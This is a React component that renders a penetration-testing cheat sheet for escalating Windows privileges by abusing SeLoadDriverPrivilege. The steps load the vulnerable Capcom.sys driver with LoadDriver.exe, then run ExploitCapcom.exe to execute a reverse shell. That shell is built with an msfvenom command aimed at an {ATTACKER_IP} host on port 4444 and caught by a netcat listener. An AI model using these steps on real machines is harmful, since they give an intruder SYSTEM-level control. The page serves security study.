import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const SeLoadDriverPrivilege = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeLoadDriverPrivilege speifies the users who are allowed to
              dynamically load device drivers. The activation of this policy in
              the context of non-privileged users implies a significant risk due
              to the possibility of executing code in kernel space.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Check if you have SeLoadDriverPrivilege.</Typography>
            <Image src="/seloaddriver1.png" width={597} height={166} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              The compiled executables are available here:
              <SyntaxHighlighter className="syntax" language="bash">
                {"https://github.com/JoshMorrison99/SeLoadDriverPrivilege"}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Compile a reverse shell with msfvenom into a file called `rev.exe.
              <SyntaxHighlighter className="syntax" language="bash">
                {
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o rev.exe"
                }
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Transfer Capcom.sys, LoadDriver.exe, rev.exe and ExploitCapcom.exe
              to victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Invoke LoadDriver.exe. This should return NTSTATUS: 00000000,
              WinError: 0. If it doesn't try changing the location of Capcom.sys
              or where you are executing LoadDriver.exe
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                ".\\LoadDriver.exe System\\CurrentControlSet\\MyService {C:\\Users\\Test\\Capcom.sys}"
              }
            </SyntaxHighlighter>
            <Image src="/seloaddriver2.png" width={975} height={114} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>Start a netcat listener on port 4444</Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 7</Typography>
            <Typography>
              Put rev.exe in C:\Windows\temp\rev.exe and execute
              ExploitCapcom.exe. C:\Windows\temp\rev.exe is the default location
              the program will search for the reverse shell executable.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {".\\ExploitCapcom.exe"}
            </SyntaxHighlighter>
            <Typography>
              You can also specify your own path to the reverse shell like so:
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                ".\\ExploitCapcom.exe C:\\Windows\\Place\\to\\reverseshell\\rev.exe"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeLoadDriverPrivilege;
